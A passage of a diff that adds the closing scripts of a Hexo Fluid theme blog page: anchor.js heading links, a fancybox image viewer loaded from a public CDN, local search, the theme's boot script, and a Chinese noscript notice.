+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
